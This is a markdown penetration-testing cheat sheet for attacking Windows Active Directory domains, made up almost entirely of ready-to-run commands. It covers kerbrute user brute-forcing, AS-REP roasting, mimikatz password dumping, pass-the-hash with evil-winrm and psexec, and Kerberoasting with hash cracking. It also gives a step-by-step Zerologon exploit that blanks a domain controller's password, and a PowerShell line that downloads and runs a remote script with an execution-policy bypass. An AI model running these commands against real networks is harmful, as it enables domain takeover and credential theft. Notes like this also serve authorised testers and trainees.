# tools
* impacket
    > git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket


## bloodhound
* setup
    > apt install bloodhound neo4j
    > neo4j console, `neo4j:kali`
    > bloodhound --no-sandbox
    > python3 -m pip install bloodhound
* bloodhound domain enum
    > bloodhound-python -d {domain} -u <username> -p <password> -gc {host}.{domain} -c all -ns 10.10.10.30


# Info
* Domain Controller
    * Kerberos: 88
    * LDAP: 389


# PowerView
* get updated PowerSploit, https://github.com/PowerShellMafia/PowerSploit
* Get all domain `computers`
    > Get-DomainComputer | % {Resolve-IPAddress -ComputerName $_.cn}
* Get all domain `users`
    > Get-NetUser
* Get domain `admins`
    > Get-DomainGroupMember -identity "Domain Admins" -Domain xor.com -DomainController <dc-ip>
* Get domain `shares`
    > Find-DomainShare -CheckShareAccess -Domain xor.com -DomainController <dc-ip>
* Followed by mimikatz to dump the `passwords`
    > mimikatz
    > privilege::debug
    > sekurlsa::logonpasswords full


# enum & exploits
* kerbrute for brute forcing discovery of users, passwords
    * https://github.com/ropnop/kerbrute/releases
    * https://github.com/Sq00ky/attacktive-directory-tools
    > kerbrute userenum -d {domain_name} --dc {dc_ip} userlist.txt
* Checking for `ASREPRoasting` vuln, check kerberos pre-authentication disabled, the account does not need to provide valid identification before requesting a Kerberos Ticket.
    > GetNPUsers.py {domain}/{username} -request -no-pass -dc-ip {dc_ip}
    > GetNPUsers.py {domain}/ -usersfile {users.txt} -request -no-pass -dc-ip {dc_ip}
* List all smb shared
    > smbclient -L \\\\{target-ip}\\ -U {user_name}
* Recurse all content under share
    > smbmap -u {user} -p {pass} -H {target-ip} -d {target.domain} -R
* Retrieve all of the password hashes (if synced with the domain controller)
    > secretsdump.py
* pass the hash
    > evil-winrm -H {html-hash} -i {target-ip} -u {user}
    > psexec.py {domain}/{user}@{targer-ip} -hashes <NTML hash>:<NTLMhash>
* Hashcat example wiki & cracking
    * https://hashcat.net/wiki/doku.php?id=example_hashes
    > hashcat64.exe -a 0 -m 18200 hash.txt passwordlist.txt


# Kerberos ticket cracking on a domain machine, Kerberoasting
* using powerview
```powershell
> Import-Module .\PowerView.ps1
> Get-NetUser -SPN | select serviceprincipalname
kadmin/changepw
HTTP/ExchangeService.xor.com
HTTP/ExtMail.xor.com
MSSQLSvc/xor-app23.xor.com:1433

or
> setspn.exe -T xor.com -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
> setspn -T xor -Q */*

> Add-Type -AssemblyName System.IdentityModel
> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "workgroup/domain:port"
```
## tickets cracking
* dump kirbi tickets, https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast
    > mimikatz "kerberos::list /export" exit
    > Compress-Archive -Path .\*.kirbi -DestinationPath .\tgt.zip
    or
    > powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>/Invoke-Kerberoast.ps1') ; 
    > Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
* https://github.com/nidem/kerberoast
    > python3 ~/tools/kerberoast/kirbi2john.py mssql.kirbi > mssql.john
    > john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt mssql.john
* kirbi2hashcat
    * https://raw.githubusercontent.com/jarilaos/kirbi2hashcat/master/kirbi2hashcat.py
    > hashcat -m 13100 --force -a 0 crack_file rockyou.txt
* tgsrepcrack
    > python3 tgsrepcrack.py /usr/share/wordlists/rockyou.txt ~/workspace/mssql.kirbi

## domain serach 
> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
> $PDC = ($domainObj.PdcRoleOwner).Name
> $SearchString = "LDAP://"
> $SearchString += $PDC + "/"
> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
> $SearchString += $DistinguishedName
> $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
> $objDomain = New-Object System.DirectoryServices.DirectoryEntry
> $Searcher.SearchRoot = $objDomain
> $Searcher.filter="serviceprincipalname=*http*"
> $Result = $Searcher.FindAll()
> Foreach($obj in $Result) { Foreach($prop in $obj.Properties) { $prop } }


# Zerologon
* updated to the latest impacket (remove the old one)
    > apt remove --purge impacket-scripts python3-impacket
    > apt autoremove
* Install:
    > git clone https://github.com/SecureAuthCorp/impacket.git
    > cd impacket
    > python3 setup.py install
* Git clone this:
    > git clone https://github.com/risksense/zerologon.git
* exploit
    > python3 set_empty_pw.py <host> <ip>
        > # python3 set_empty_pw DC_NETBIOS_NAME DC_IP_ADDR
    > secretsdump.py -hashes :<hash> '<domain>/<host>$@<ip>'
        > # secretsdump.py -hashes :<hash> 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr'
    > wmiexec.py <domain>/Administrator@<ip> -hashes aad3b435b51404eeaad3b435b51404ee:fc9bc6a6f510b2a92388f67962a33b1c
* offline cracking
    > reg save HKLM\SYSTEM system.save
    > reg save HKLM\SAM sam.save
    > reg save HKLM\SECURITY security.save
    > get system.save
    > get sam.save
    > get security.save
    > del /f system.save
    > del /f sam.save
    > del /f security.save
* crack original ntlm hash
    > secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
* reinstall the hashes to the domain. Reinstalling the original hash is necessary for the DC to continue to operate normally.
    > python3 reinstall_original_pw.py <host> <ip> ORIG_NT_HASH
    > # python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH


# ref
https://wadcoms.github.io/
* attack domain joined via leaked pfx cert
https://chowdera.com/2022/04/202204042238391625.html
